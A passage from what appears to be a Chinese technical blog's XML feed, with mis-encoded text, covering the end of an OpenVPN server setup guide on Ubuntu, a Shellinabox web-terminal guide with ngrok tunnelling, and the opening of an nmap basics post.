dh2048.pem</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554430900402.png" alt="1554430900402"></p><p>å¦‚æœæœåŠ¡å™¨è¯ä¹¦ä¸€å¼€å§‹å°±å‘½åä¸ºserveré»˜è®¤å€¼ï¼Œè¿™é‡Œå°±ä¸ç”¨ä¿®æ”¹äº†</p><p>å»æ‰ä¸‹é¢çš„æ³¨é‡Šï¼Œå¹¶å†ä¸‹ä¸€è¡Œæ·»åŠ <code>key-direction 0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 0 # This file is secret</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554431450577.png" alt="1554431450577"></p><p>æœ€åï¼Œæ‰¾åˆ°userå’Œgroupå‚æ•°ï¼Œå»é™¤å®ƒä»¬ä¹‹å‰çš„<code>;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;user nobody</span><br><span class="line">;group nogroup</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554431475663.png" alt="1554431475663"></p><p><strong>ï¼ˆå¯é€‰é…ç½®ï¼‰æ¨åŠ¨DNSæ›´æ”¹è®©VPNé‡å®šå‘æ‰€æœ‰æµé‡</strong></p><p>ä¸Šé¢çš„é…ç½®å¯ä»¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ä¸Šåˆ›å»ºVPNè¿æ¥ï¼Œä½†æ˜¯æ²¡æœ‰å¼ºè¿«è¿æ¥å»ä½¿ç”¨tunnelã€‚å¦‚æœå¸Œæœ›ç”¨VPNæ¥è·¯ç”±æ‰€æœ‰æµé‡ï¼Œéœ€è¦æ›´æ”¹å®¢æˆ·ç«¯æœºå™¨çš„DNSè®¾ç½®ã€‚</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554431815982.png" alt="1554431815982"></p><p>è¿™æ ·å°±å¯ä»¥ååŠ©å®¢æˆ·ç‰ˆé‡æ–°é…ç½®DNSï¼Œä»¥ä¾¿ä½¿ç”¨VPN tunnelæ¥ä½œä¸ºé»˜è®¤ç½‘å…³ã€‚</p><p><strong>ï¼ˆå¯é€‰é…ç½®ï¼‰ä¿®æ”¹OpenVPNæœåŠ¡å™¨çš„ç«¯å£å’Œåè®®</strong></p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554431906735.png" alt="1554431906735"></p><p>å¦‚æœæ²¡æœ‰æ›´æ¢ç«¯å£çš„éœ€æ±‚ï¼Œæœ€å¥½å°†ä¸Šè¿°çš„ä¸¤é¡¹ä¿æŒé»˜è®¤è®¾ç½®ã€‚</p><h3 id="3-é˜²ç«å¢™è®¾ç½®"><a href="#3-é˜²ç«å¢™è®¾ç½®" class="headerlink" title="3. é˜²ç«å¢™è®¾ç½®"></a>3. é˜²ç«å¢™è®¾ç½®</h3><h4 id="1-æ‰“å¼€ipè½¬å‘"><a href="#1-æ‰“å¼€ipè½¬å‘" class="headerlink" title="1. æ‰“å¼€ipè½¬å‘"></a>1. æ‰“å¼€ipè½¬å‘</h4><p>æˆ‘ä»¬éœ€è¦è®©æœåŠ¡å™¨æ¥è½¬å‘æµé‡ï¼Œè¿™æ˜¯éœ€è¦VPNæœåŠ¡å™¨æ¥æä¾›çš„æœ€åŸºæœ¬çš„åŠŸèƒ½ã€‚å¯ä»¥é€šè¿‡ä¿®æ”¹/etc/sysctl.confæ–‡ä»¶æ¥è°ƒæ•´ç½‘ç»œè®¾ç½®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>å–æ¶ˆæ³¨é‡Š<code>net.ipv4.ip_forward</code>ï¼Œå®Œæˆåä¿å­˜å¹¶é€€å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><p>è¯»å–sysctl.confæ–‡ä»¶å¹¶ä¸”è®©è°ƒæ•´åè®¾ç½®å¯¹å½“å‰ç³»ç»Ÿçš„sessionç”Ÿæ•ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -p</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554432065420.png" alt="1554432065420"></p><h4 id="2-æ·»åŠ è§„åˆ™"><a href="#2-æ·»åŠ è§„åˆ™" class="headerlink" title="2. æ·»åŠ è§„åˆ™"></a>2. æ·»åŠ è§„åˆ™</h4><p><strong>è°ƒæ•´é˜²ç«å¢™ï¼ˆUFWï¼‰è§„åˆ™</strong></p><p>é…ç½®é˜²ç«å¢™è§„åˆ™æ¥å¼•å¯¼è¿›å…¥æœåŠ¡å™¨çš„ä¸€äº›æµé‡ï¼Œéœ€è¦ä¿®æ”¹é˜²ç«å¢™è§„åˆ™æ–‡ä»¶æ¥å»ºç«‹ä¼ªè£…è§„åˆ™ï¼Œiptablesçš„æ¦‚å¿µç”¨äºæä¾›åŠ¨æ€çš„NATï¼Œä»è€Œæ­£ç¡®åœ°è·¯ç”±å®¢æˆ·ç«¯è¿æ¥ã€‚åœ¨æ‰“å¼€é˜²ç«å¢™é…ç½®æ–‡ä»¶ä»¥æ·»åŠ ä¼ªè£…è§„åˆ™ä¹‹å‰ï¼Œéœ€è¦æ‰¾åˆ°UbuntuæœåŠ¡å™¨çš„å…¬å…±ç½‘ç»œæ¥å£ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route | grep default</span><br></pre></td></tr></table></figure><p>å…¬å…±ç½‘ç»œæ¥å£åº”å½“ç´§è·Ÿåœ¨å•è¯â€devâ€åé¢ï¼Œä¾‹å¦‚ï¼Œæˆ‘çš„æ¥å£åå­—ä¸ºens33ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default via 172.18.31.253 dev ens33</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554432573267.png" alt="1554432573267"></p><p>æ‰“å¼€/etc/ufw/before.rulesè¿™ä¸ªæ–‡ä»¶å¹¶æ·»åŠ ç›¸åº”çš„è§„åˆ™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ufw/before.rules</span><br></pre></td></tr></table></figure><p>åœ¨æœ€å‰é¢å¡«å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># START OPENVPN RULES</span><br><span class="line"># NAT table rules</span><br><span class="line">*nat</span><br><span class="line">:POSTROUTING ACCEPT [0:0] </span><br><span class="line"># Allow traffic from OpenVPN client to eth0</span><br><span class="line">-A POSTROUTING -s 10.8.0.0/8 -o ens33 -j MASQUERADE</span><br><span class="line">COMMIT</span><br><span class="line"># END OPENVPN RULES</span><br></pre></td></tr></table></figure><p>å…¶ä¸­10.8.0.0/8ä¸ºopenvpnå®¢æˆ·ç«¯è·å–çš„ipï¼Œå¦‚åœ¨server.confé‡Œé¢ä¿®æ”¹ï¼Œæ­¤å¤„åº”æ›¿æ¢ä¸ºç›¸åº”ipï¼Œens33ä¸ºubuntuè¿æ¥ç½‘ç»œçš„ç½‘å¡</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554432778966.png" alt="1554432778966"></p><p>ç„¶åå‘Šè¯‰é˜²ç«å¢™é»˜è®¤å…è®¸è½¬å‘åŒ…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/ufw</span><br></pre></td></tr></table></figure><p>å°†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;DROP&quot;</span><br></pre></td></tr></table></figure><p>æ”¹ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;ACCEPT&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554432909071.png" alt="1554432909071"></p><h4 id="3-å¼€æ”¾ç«¯å£"><a href="#3-å¼€æ”¾ç«¯å£" class="headerlink" title="3. å¼€æ”¾ç«¯å£"></a>3. å¼€æ”¾ç«¯å£</h4><p><strong>æ‰“å¼€OpenVPNç«¯å£å¹¶ä¸”ä½¿å˜åŒ–ç”Ÿæ•ˆ</strong></p><p>è°ƒæ•´é˜²ç«å¢™æœ¬èº«ï¼Œä»¥å…è®¸æµé‡åˆ°OpenVPNã€‚å¦‚æœåœ¨/etc/openvpn/server.confæ–‡ä»¶ä¸­æ²¡æœ‰ä¿®æ”¹OpenVPNçš„ç«¯å£å·å’Œåè®®ç±»å‹ï¼Œé‚£ä¹ˆç›´æ¥é…ç½®é˜²ç«å¢™å…è®¸UDPæµé‡åˆ°1194ç«¯å£ï¼Œå¦‚æœæ”¹å˜äº†ç«¯å£å’Œåè®®ç±»å‹ï¼Œé‚£ä¹ˆæ ¹æ®è‡ªå·±è®¾ç½®çš„ç«¯å£å’Œåè®®ç±»å‹è¿›è¡Œé…ç½®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 1194/udp</span><br><span class="line">sudo ufw allow OpenSSH</span><br></pre></td></tr></table></figure><p>  ä»æ‰€æœ‰ä¿®æ”¹è¿‡çš„æ–‡ä»¶ä¸­è£…è½½é…ç½®æ¥å…³é—­å’Œé‡å¯é˜²ç«å¢™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br><span class="line">sudo ufw enable</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554433320308.png" alt="1554433320308"></p><p>è‡³æ­¤æœåŠ¡å™¨ç«¯å¯ä»¥æ­£ç¡®åœ°å¤„ç†OpenVPNæµé‡äº†ã€‚</p><h2 id="ä¸ƒã€å¯åŠ¨OpenVPNæœåŠ¡"><a href="#ä¸ƒã€å¯åŠ¨OpenVPNæœåŠ¡" class="headerlink" title="ä¸ƒã€å¯åŠ¨OpenVPNæœåŠ¡"></a>ä¸ƒã€å¯åŠ¨OpenVPNæœåŠ¡</h2><p>åœ¨systemdå•å…ƒæ–‡ä»¶çš„åé¢ï¼Œå¯ä»¥é€šè¿‡æŒ‡å®šç‰¹å®šçš„é…ç½®æ–‡ä»¶åæ¥ä½œä¸ºä¸€ä¸ªå®ä¾‹å˜é‡æ¥å¼€å¯OpenVPNæœåŠ¡ï¼Œæˆ‘ä»¬çš„é…ç½®æ–‡ä»¶åç§°ä¸º/etc/openvpn/server.confï¼Œæ‰€ä»¥åœ¨systemdå•å…ƒæ–‡ä»¶çš„åé¢æ·»åŠ @serveræ¥å¼€å¯OpenVPNæœåŠ¡:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start openvpn@server</span><br><span class="line">sudo systemctl status openvpn@server</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸€åˆ‡æ­£å¸¸çš„è¯ï¼Œè¾“å‡ºåº”å½“è·Ÿå¦‚ä¸‹ç±»ä¼¼:</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554433559377.png" alt="1554433559377"></p><p>é€šè¿‡<code>ifconfig</code>å¯ä»¥æŸ¥çœ‹æ–°å¢çš„ipä¸º<code>inet addr:10.8.0.1</code>çš„<code>tun0</code>ç½‘å¡</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554433627533.png" alt="1554433627533"></p><p>æˆ–è€…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show tun0</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554433680420.png" alt="1554433680420"></p><p>å¦‚æœä¸€åˆ‡è¿è¡Œæ­£å¸¸ï¼Œå°†OpenVPNè®¾ç½®ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable openvpn@server</span><br></pre></td></tr></table></figure><h2 id="å…«ã€å®¢æˆ·ç«¯é…ç½®"><a href="#å…«ã€å®¢æˆ·ç«¯é…ç½®" class="headerlink" title="å…«ã€å®¢æˆ·ç«¯é…ç½®"></a>å…«ã€å®¢æˆ·ç«¯é…ç½®</h2><p><strong>åˆ¶ä½œå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/openvpn/ca/keys</span><br><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf .</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯ä¸€ç›´rootæƒé™æ“ä½œï¼Œæ‰€ä»¥ubuntuæ™®é€šç”¨æˆ·æ²¡æœ‰è®¿é—®è¯ä¹¦ç›®å½•çš„æƒé™ï¼Œå¯èµ‹äºˆæ™®é€šç”¨æˆ·è¯»å–æƒé™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R +rx /etc/openvpn/ca/</span><br></pre></td></tr></table></figure><p>ç”¨scpç­‰æ–¹æ³•å°†keysä¸­çš„å®¢æˆ·ç«¯è¯ä¹¦æ–‡ä»¶å¤åˆ¶åˆ°å®¢æˆ·ç«¯ä¸Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca.crt</span><br><span class="line">ta.key </span><br><span class="line">client.crt </span><br><span class="line">client.key </span><br><span class="line">client.conf</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554434147405.png" alt="1554434147405"></p><p>æ‰“å¼€client.conf å°†<code>remote my-server-1 1194</code>ä¸­<code>my-server-1</code> <code>1194</code>æ›¿æ¢ä¸ºæœåŠ¡å™¨çš„ip/åŸŸåï¼Œç«¯å£ï¼Œå¹¶å»æ‰å‰é¢çš„åˆ†å·</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554434551477.png" alt="1554434551477"></p><p>å»æ‰å‰é¢çš„åˆ†å·</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554434461184.png" alt="1554434461184"></p><p>è®¾ç½®è¯ä¹¦åœ°å€,å¦‚æœè‡ªå®šä¹‰äº†å®¢æˆ·ç«¯è¯ä¹¦åç§°è‡ªè¡Œæ›´æ”¹</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554434518742.png" alt="1554434518742"></p><p>åˆ æ‰åˆ†å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 1</span><br></pre></td></tr></table></figure><p>å¹¶åœ¨ä¸‹ä¸€è¡Œæ·»åŠ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key-direction 1</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554434639408.png" alt="1554434639408"></p><p>æŠŠclient.confå‘½åä¸ºclient.ovpnï¼Œç„¶åå°†<strong>ca.crt ta.key client.crt client.key client.ovpn</strong>å¤åˆ¶åˆ°å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ç›®å½•ï¼ˆæ­¤ä¸ºwindowsç¯å¢ƒä¸‹ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\OpenVPN\config</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554434791663.png" alt="1554434791663"></p><h2 id="ä¹ã€è¿æ¥æµ‹è¯•"><a href="#ä¹ã€è¿æ¥æµ‹è¯•" class="headerlink" title="ä¹ã€è¿æ¥æµ‹è¯•"></a>ä¹ã€è¿æ¥æµ‹è¯•</h2><p>å®¢æˆ·ç«¯å¯è®¿é—®å®˜ç½‘ï¼ˆéœ€è¦FQï¼‰ï¼Œæˆ–è€…é€šè¿‡ç¬¬ä¸‰æ–¹æ¸ é“ä¸‹è½½å®‰è£…</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554435021629.png" alt="1554435021629"></p><p>å¦‚å›¾è¿æ¥æˆåŠŸ</p><p><img src="/2019/04/07/Ubuntu16ä¸‹æ­å»ºOpenVPNæœåŠ¡/1554438169932.png" alt="1554438169932"></p><p>ä»¥ä¸Šå°±æ˜¯openvpnæœåŠ¡çš„æ­å»ºè¿‡ç¨‹ï¼Œå¦‚æœ‰ä¸å¯¹é—æ¼ä¹‹å¤„ï¼Œè¿˜æœ›æ–§æ­£ï¼Œè°¢è°¢ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenVPN </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webç»ˆç«¯ä¹‹shellinaboxï¼ˆé…åˆngrokè¿œç¨‹ç™»é™†ï¼‰</title>
      <link href="/2019/03/21/Web%E7%BB%88%E7%AB%AF%E4%B9%8Bshellinabox%EF%BC%88%E9%85%8D%E5%90%88ngrok%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%89/"/>
      <url>/2019/03/21/Web%E7%BB%88%E7%AB%AF%E4%B9%8Bshellinabox%EF%BC%88%E9%85%8D%E5%90%88ngrok%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h2><p>Shellinabox æ˜¯ä¸€ä¸ªåŸºäº web çš„ç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼Œé‡‡ç”¨ C è¯­è¨€ç¼–å†™ï¼Œä½¿ç”¨ Ajax ä¸åç«¯æœåŠ¡é€šä¿¡ã€‚å®ƒå®ç°äº†ä¸€ä¸ª Webserverï¼Œé»˜è®¤ç›‘å¬ 4200 ç«¯å£ï¼Œåœ¨æ”¯æŒ Javascript å’Œ CSS çš„æµè§ˆå™¨ä¸Šè®¿é—® <a href="http://host:4200" target="_blank" rel="noopener">http://host:4200</a> å³å¯ã€‚å¹¶ä¸”å¯ä»¥é…ç½® SSL/TLS è¯ä¹¦ï¼Œä½¿ç”¨ https æ–¹å¼åŠ å¯†é€šä¿¡ã€‚</p><h2 id="äºŒã€å®‰è£…"><a href="#äºŒã€å®‰è£…" class="headerlink" title="äºŒã€å®‰è£…"></a>äºŒã€å®‰è£…</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install shellinabox#Debianç³»</span><br><span class="line">yum install shellinabox#RHELç³»</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€å¯åŠ¨"><a href="#ä¸‰ã€å¯åŠ¨" class="headerlink" title="ä¸‰ã€å¯åŠ¨"></a>ä¸‰ã€å¯åŠ¨</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellinaboxd -h#æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯</span><br><span class="line">shellinaboxd -b -t  #è¿è¡Œ</span><br><span class="line">-b#åœ¨åå°è¿è¡Œ</span><br><span class="line">-t#ä½¿ç”¨åŸºäºhttpåè®®çš„ç»ˆç«¯</span><br></pre></td></tr></table></figure><a id="more"></a><p><strong>æŸ¥çœ‹ç«¯å£</strong></p><p>æŸ¥çœ‹è¿›ç¨‹ï¼Œæ˜¯å¦å¯åŠ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntulp | grep shellinabox</span><br></pre></td></tr></table></figure><h2 id="å››ã€é…ç½®"><a href="#å››ã€é…ç½®" class="headerlink" title="å››ã€é…ç½®"></a>å››ã€é…ç½®</h2><h3 id="1-åˆ›å»ºæ™®é€šç”¨æˆ·"><a href="#1-åˆ›å»ºæ™®é€šç”¨æˆ·" class="headerlink" title="1. åˆ›å»ºæ™®é€šç”¨æˆ·"></a>1. åˆ›å»ºæ™®é€šç”¨æˆ·</h3><p>é»˜è®¤ç¦ç”¨rootç™»é™†ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªæ™®é€šç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd username</span><br></pre></td></tr></table></figure><h3 id="2-ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#2-ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="2. ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>2. ä¿®æ”¹é…ç½®æ–‡ä»¶</h3><p>å¯ä»¥éœ€ä¿®æ”¹ç«¯å£ï¼Œæˆ–å…¶ä»–é…ç½®é€‰é¡¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/shellinabox</span><br></pre></td></tr></table></figure><h2 id="äº”ã€ç™»é™†"><a href="#äº”ã€ç™»é™†" class="headerlink" title="äº”ã€ç™»é™†"></a>äº”ã€ç™»é™†</h2><p>å±€åŸŸç½‘å†…è®¿é—®  <a href="ip:4200" target="_blank" rel="noopener">ip:4200</a></p><p>è¾“å…¥ç”¨æˆ·åå¯†ç å³å¯ç™»é™†</p><h2 id="å…­ã€å†…ç½‘æ˜ å°„ï¼ˆå¯é€‰ï¼‰"><a href="#å…­ã€å†…ç½‘æ˜ å°„ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="å…­ã€å†…ç½‘æ˜ å°„ï¼ˆå¯é€‰ï¼‰"></a>å…­ã€å†…ç½‘æ˜ å°„ï¼ˆå¯é€‰ï¼‰</h2><h3 id="1-ä½¿ç”¨ngrok"><a href="#1-ä½¿ç”¨ngrok" class="headerlink" title="1.ä½¿ç”¨ngrok"></a>1.ä½¿ç”¨ngrok</h3><p><strong>ä½¿ç”¨ngrokï¼Œå°†åŸºäºWEBçš„ç»ˆç«¯æ˜ å°„åˆ°å…¬ç½‘</strong></p><ol><li>è®¿é—®<a href="https://www.ngrok.cc/user.html" target="_blank" rel="noopener">https://www.ngrok.cc/user.html</a> æ³¨å†Œ ç™»å½• æ‰¾åˆ°â€å¼€é€šéš§é“â€ï¼›</li><li>é€‰æ‹©  <code>é¦™æ¸¯Ngrokå…è´¹æœåŠ¡å™¨</code> ,åœ¨æ¥ä¸‹æ¥çš„ç•Œé¢ä¸­é€‰æ‹©éš§é“åè®® <code>http</code> ,åç§°<code>shellinabox</code>ï¼ˆå¯éšä¾¿å¡«ï¼‰ï¼Œå‰ç½®åŸŸå (ä¸å†²çªå³å¯)ï¼Œæœ¬åœ°ç«¯å£(IP:PORT)è¢«è½¬å‘çš„ipå’Œç«¯å£ï¼ˆä¸è¦å¡«127.0.0.1ï¼‰ï¼Œç”¨æˆ·åå¯†ç å¯é€‰å¡«</li><li>åœ¨éš§é“ç®¡ç†ä¸­å¯ä»¥çœ‹åˆ°åˆšæ‰å»ºç«‹çš„éš§é“ï¼Œéœ€è¦å…³æ³¨ <code>éš§é“ID</code>  <code>æœ¬åœ°ç«¯å£</code> ä»¥åŠ<code>åŸŸå</code> ï¼Œç„¶åå»ä¸‹è½½Ngrokå®¢æˆ·ç«¯</li><li>ä¸‹è½½linuxå®¢æˆ·ç«¯ï¼Œ./sunny clientid éš§é“ID</li><li>ç„¶åç­‰å¾…è¯¥éš§é“çš„å»ºç«‹  è®¿é—®åŸŸåå³å¯</li></ol><p><strong>ngrok.ccè¯¦ç»†ä½¿ç”¨æ•™ç¨‹ï¼š<a href="http://www.ngrok.cc/_book/" target="_blank" rel="noopener">http://www.ngrok.cc/_book/</a></strong></p><h3 id="2-ä½¿ç”¨frp"><a href="#2-ä½¿ç”¨frp" class="headerlink" title="2.ä½¿ç”¨frp"></a>2.ä½¿ç”¨frp</h3><h3 id="3-ä½¿ç”¨èŠ±ç”Ÿå£³"><a href="#3-ä½¿ç”¨èŠ±ç”Ÿå£³" class="headerlink" title="3.ä½¿ç”¨èŠ±ç”Ÿå£³"></a>3.ä½¿ç”¨èŠ±ç”Ÿå£³</h3><p>å¯å»å®˜ç½‘å¼€é€š    <a href="https://hsk.oray.com/" target="_blank" rel="noopener">https://hsk.oray.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·æ”¶é›† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellinabox </tag>
            
            <tag> ngrok </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmapåŸºç¡€å‘½ä»¤</title>
      <link href="/2019/03/16/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/03/16/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h2><p><strong>nmap (network mapper)</strong> æœ€æ—©æ˜¯Linuxä¸­æ‰«æå’Œå—…æ¢å·¥å…·ï¼Œç½‘ç»œè¿æ¥ç«¯æ‰«æå·¥å…·ï¼Œä¸»è¦æ˜¯æ¢æµ‹ç›®æ ‡æœºå™¨ä¸Šå¼€å¯çš„æœåŠ¡ã€å®‰å…¨æ€§é—®é¢˜ã€ä¸»æœºå­˜æ´»ç­‰ç­‰</p><h2 id="äºŒã€åŸºæœ¬åŠŸèƒ½"><a href="#äºŒã€åŸºæœ¬åŠŸèƒ½" class="headerlink" title="äºŒã€åŸºæœ¬åŠŸèƒ½"></a>äºŒã€åŸºæœ¬åŠŸèƒ½</h2><ol><li>æ¢æµ‹æœºå™¨å­˜æ´»æƒ…å†µï¼›ï¼ˆæ˜¯å¦å¼€æœºï¼‰</li><li>æ‰«ç«¯å£ï¼›ï¼ˆæœåŠ¡ï¼‰</li><li>æ‰«æç›®æ ‡æœºå™¨ç³»ç»Ÿç±»å‹ï¼›ï¼ˆOSç±»å‹ï¼šNT/Linuxï¼‰</li></ol><h2 id="ä¸‰ã€é«˜çº§ç”¨æ³•ï¼›"><a href="#ä¸‰ã€é«˜çº§ç”¨æ³•ï¼›" class="headerlink" title="ä¸‰ã€é«˜çº§ç”¨æ³•ï¼›"></a>ä¸‰ã€é«˜çº§ç”¨æ³•ï¼›</h2><ol><li>æ‰«æç›®æ ‡æœºå™¨ä¸Šçš„å®‰å…¨æ¼æ´ï¼›</li></ol><a id="more"></a><h2 id="å››ã€nmapå®‰è£…"><a href="#å››ã€nmapå®‰è£…" class="headerlink" title="å››ã€nmapå®‰è£…"></a>å››ã€nmapå®‰è£…</h2><h2 id="äº”ã€é…ç½®ç¯å¢ƒå˜é‡"><a href="#äº”ã€é…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="äº”ã€é…ç½®ç¯å¢ƒå˜é‡"></a>äº”ã€é…ç½®ç¯å¢ƒå˜é‡</h2><h2 id="å…­ã€åŸºæœ¬ç”¨æ³•"><a href="#å…­ã€åŸºæœ¬ç”¨æ³•" class="headerlink" 